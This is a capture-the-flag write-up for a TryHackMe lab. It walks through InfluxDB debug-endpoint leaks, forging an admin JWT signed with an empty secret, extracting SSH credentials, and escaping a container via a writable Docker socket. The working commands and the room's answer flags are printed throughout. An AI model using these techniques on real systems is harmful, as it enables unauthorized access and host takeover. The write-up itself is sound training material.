# Sweettooth Inc Writeup - TryHackMe 🚩
This writeup documents the exploitation process for the **Sweettooth Inc.** machine on TryHackMe, covering InfluxDB exploitation via JWT hijacking and Docker Socket Escape to gain root access on the host.

## Room details
Difficulty: Medium

Type: InfluxDB, JWT Exploitation, Docker Escape

Link: https://tryhackme.com/room/sweettoothinc

## 1. Reconnaissance
The process began with an nmap scan to identify services running on target 10.81.143.182.

```bash
nmap 10.81.143.182
```

Scan Results:

Port 111 (rpcbind): Open

Port 2222 (SSH): Open

Port 8086 (InfluxDB): Open

![Nmap Results](<./assets/Screenshot 1.png>)
<br>
*Figure 1: (Nmap Port Scanning Results).*


```bash 
nmap -sV --script vuln -T4 -Pn -v 10.81.143.182
```
The scan confirmed the service on port 8086 as InfluxDB v1.3.0. This specific version is often targeted for its verbosity in debug endpoints.

![DB software name](<./assets/Screenshot 2.png>)
<br>
*Figure 2: (Identification of InfluxDB v1.3.0 running on port 8086).*

---
## 2. Information Disclosure & JWT Exploitation
The InfluxDB service was found to have the /debug/vars and /debug/requests endpoints exposed. These endpoints are goldmines for attackers as they leak internal configuration and session data.

# Database Enumeration:
Using curl, I extracted the names of the databases managed by the instance.
```bash
curl -s http://10.81.143.182:8086/debug/vars | grep -oP '\"database\":\"\K[^\^]+' | sort -u
```
Result: Identified four database names: creds, docker, mixer, tanks.

![DB name](<./assets/Screenshot 3.png>)
<br>
*Figure 3: (Identified the database names: creds, docker, mixer, tanks).*

---

# Username Discovery
By inspecting recent API requests, I discovered a valid database username.

```bash
curl -i http://10.81.143.182:8086/debug/requests
```

Found the database username: o5yY6yya.

![Found username](<./assets/Screenshot 4.png>)
<br>
*Figure 4: (Identified the usernames: o5yY6yya.)*

---


# Bypassing Authentication (JWT Forging)
InfluxDB 1.3.0 can be configured to use JWT for authentication. A critical misconfiguration was discovered: the instance used an empty secret string for signing tokens. I used a Python one-liner to generate a forged admin token for the user o5yY6yya.

```bash
python3 -c 'import jwt; print(jwt.encode({"username": "o5yY6yya", "exp": 2000000000}, "", algorithm="HS256"))'
```
![Generate token](<./assets/Screenshot 5.png>)
<br>
*Figure 5: (Generate JWT admin token.)*

---

# Data Extraction
With the forged token, I queried the tanks database to retrieve telemetry data required for the room's objectives.

```bash
curl -s -G "http://10.81.143.182:8086/query?db=tanks" \
--data-urlencode "q=SELECT temperature FROM water_tank WHERE time = 1621346400000000000" \
-H "Authorization: Bearer <FORGED_TOKEN>"
```

![Temperature of the water tank at 1621346400](<./assets/Screenshot 6.png>)
<br>
*Figure 6: (Temperature of the water tank at 1621346400.)*

---

I also queried the mixer database to find the highest RPM reached by the motor

```bash
curl -G "http://10.81.143.182:8086/query?db=mixer" \
--data-urlencode "q=SELECT MAX(motor_rpm) FROM mixer_stats" \
-H "Authorization: Bearer <FORGED_TOKEN>"
```

---

![The highest rpm the motor of the mixer reached](<./assets/Screenshot 7.png>)
<br>
*Figure 7: (The highest rpm the motor of the mixer reached.)*


---


## 3. Initial Access (User: uzJk6Ry98d8C)
Using the forged JWT token, I queried the creds database and specifically the ssh measurement to retrieve the SSH credentials.
```bash
curl -s -G "http://10.81.143.182:8086/query?db=creds" \
--data-urlencode "q=SELECT * FROM ssh" \
-H "Authorization: Bearer <FORGED_TOKEN>"
```
![Generate token](<./assets/Screenshot 8.png>)
<br>
*Figure 8: (SSH UNAME and PASS)*

---
I used these credentials to log in via SSH on port 2222. This confirmed that we were inside a Docker container.

```bash
ssh uzJk6Ry98d8C@10.81.143.182 -p 2222
```

![SSH Login and user.txt flag](<./assets/Screenshot 9.png>)
<br>
*Figure 9: (SSH Login and user.txt flag)*

I successfully logged in via SSH on port 2222.
and got flag from user.txt
User Flag: THM{V4w4FhBmtp4RFDti}

## 4. Privilege Escalation (Container Root)
During internal enumeration, I found that the Docker socket (/var/run/docker.sock) was writable by the current user. This is a common path for privilege escalation and container escapes.

However, the container was stripped of essential binaries like curl or wget. To overcome this, I used socat to communicate directly with the Docker Unix Socket using raw HTTP headers.

I targeted the Docker API's archive endpoint to read the root flag located at /root/root.txt inside the container.

```bash
echo -e "GET /containers/GGWP/archive?path=/root/root.txt HTTP/1.1\r\nHost: localhost\r\n\r\n" | /usr/bin/socat - UNIX-CONNECT:/var/run/docker.sock
```
![/root/root.txt flag](<./assets/Screenshot 10.png>)
<br>
*Figure 10: (/root/root.txt flag)*

root flag : THM{5qsDivHdCi2oabwp}

5. Docker Escape (Host Root)
To escape the container and gain root access to the host, I created a new container and mounted the host's root directory (/) to /mnt inside the container.

Exploitation Steps:

- Created a container named GGWP with a bind mount.

- Started the container.

- Used the archive endpoint to read the flag from the host's /root directory via the /mnt mount point.

```bash
echo -e "GET /containers/GGWP/archive?path=/mnt/root/root.txt HTTP/1.1\r\nHost: localhost\r\n\r\n" | /usr/bin/socat - UNIX-CONNECT:/var/run/docker.sock
```

![The second /root/root.txt flag](<./assets/Screenshot 11.png>)
<br>
*Figure 11: (The second /root/root.txt flag)*

## Final Results:

The second /root/root.txt flag: THM{nY2ZahyFABAmjrnx}

Final
All tasks completed successfully.
![Final](<./assets/Screenshot 12.png>)
<br>
*Figure 12: (Final)*
